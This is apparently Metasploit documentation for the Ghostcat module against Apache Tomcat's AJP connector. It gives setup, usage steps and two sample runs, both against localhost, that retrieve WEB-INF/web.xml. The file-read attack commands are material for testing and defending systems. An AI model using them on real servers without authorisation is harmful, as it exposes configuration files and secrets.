## Vulnerable Application

### Description

This module can be used to retrieve arbitrary files from anywhere in the web application, including the `WEB-INF` and `META-INF`
directories and any other location that can be reached via `ServletContext.getResourceAsStream()` on Apache Tomcat servers.
It also allows the attacker to process any file in the web application as JSP.

### Setup

Running within a docker container:

```
docker run --name tomcat --rm -p 8080:8080 -p 8009:8009 tomcat:8.5.32
```

## Verification Steps

1. Install the application and start it
2. Start msfconsole
3. Do: `use auxiliary/admin/http/tomcat_ghostcat`
4. Do: `set RHOSTS [ip]`
5. Do: `set RPORT [port]`
6. Do: `set FILENAME [filename]`
7. Do: `run`

## Options

### FILENAME
The file you would like to retrieve from the target web application. Defaults to `/WEB-INF/web.xml`

### AJP_PORT
The port on the target that is running the Apache JServ Protocol (AJP).

## Scenarios

### Apache Tomcat 8.5.32

```
msf6 > use auxiliary/admin/http/tomcat_ghostcat
msf6 auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(admin/http/tomcat_ghostcat) > set RPORT 8080
RPORT => 8080
msf6 auxiliary(admin/http/tomcat_ghostcat) > set FILENAME /WEB-INF/web.xml
FILENAME => /WEB-INF/web.xml
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
[*] Running module against 127.0.0.1
Status Code: 200
Accept-Ranges: bytes
ETag: W/"1227-1529524397000"
Last-Modified: Wed, 20 Jun 2018 19:53:17 GMT
Content-Type: application/xml
Content-Length: 1227
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
  version="3.1"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>

[+] 127.0.0.1:8080 - /Users/user/.msf4/loot/20210408102538_default_127.0.0.1_WEBINFweb.xml_436040.txt
[*] Auxiliary module execution completed
```

### Apache Tomcat on Windows 10.0.16299.125

```
  [*] Processing tomcat_ghostcat.rb for ERB directives.
  resource (tomcat_ghostcat.rb)> use auxiliary/admin/http/tomcat_ghostcat
  resource (tomcat_ghostcat.rb)> set rport 8080
  rport => 8080
  resource (tomcat_ghostcat.rb)> set rhosts 127.0.0.1
  rhosts => 127.0.0.1
  resource (tomcat_ghostcat.rb)> set verbose true
  verbose => true
  resource (tomcat_ghostcat.rb)> set FILENAME /WEB-INF/web.xml
  filename => /WEB-INF/web.xml

  resource (tomcat_ghostcat.rb)> run
  [*] Running module against 127.0.0.1
  <?xml version="1.0" encoding="UTF-8"?>
<!--
    Copyright 2017 The MIT Internet Trust Consortium

    Portions copyright 2011-2013 The MITRE Corporation

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
-->

  <web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"

xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd">

version = "4.0"
metadata-complete="true">

<display-name> Welcome to Tomcat </display-name>
<description>
 Welcome to Tomcat
 </description>

 <web-app>
[*] Auxiliary module execution completed

```
